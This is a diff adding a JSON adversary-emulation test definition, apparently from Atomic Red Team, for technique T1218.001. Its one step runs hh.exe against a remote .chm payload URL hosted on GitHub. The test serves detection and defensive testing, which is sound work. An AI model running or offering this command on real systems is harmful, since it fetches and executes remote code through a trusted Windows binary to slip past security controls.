@@ -1,0 +1,31 @@
+{
+  "id": "0f8af516-9818-4172-922b-42986ef1e81d",
+  "name": "Compiled HTML Help Remote Payload",
+  "description": "Uses hh.exe to execute a remote compiled HTML Help payload.\nUpon execution displays an error saying the file cannot be open\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "d7a3dc58-4f5d-4748-83f5-e8fbeb24afc2",
+      "type": "execute-command",
+      "data": {
+        "command": "hh.exe #{remote_chm_file}\n",
+        "command_type": "command_prompt"
+      },
+      "elevation_required": false
+    }
+  ],
+  "tags": [
+    "T1218.001",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_chm_file",
+      "type": "url",
+      "description": "Remote .chm payload",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm"
+    }
+  ]
+}
